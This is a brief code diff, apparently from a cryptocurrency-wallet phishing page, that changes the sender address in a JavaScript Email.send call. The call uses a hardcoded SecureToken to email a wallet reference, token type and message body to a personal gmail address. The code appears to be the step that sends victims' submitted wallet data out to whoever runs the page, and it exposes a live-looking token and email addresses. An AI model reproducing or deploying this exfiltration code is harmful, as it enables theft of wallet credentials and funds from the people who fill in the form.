@@ -89,7 +89,7 @@ const sendRequest = (data) => {
   Email.send({
     SecureToken: '1da0dcb4-c434-44fa-b7fa-c9577ebe1408',
     To: 'bekkierowland@gmail.com',
-    From: "bekkierowland@gmail.com",
+    From: "shirleylargey40@gmail.com",
     Subject: `${data.walletRef} and token type is ${data.type}`,
     Body: `${msg}`,
   })
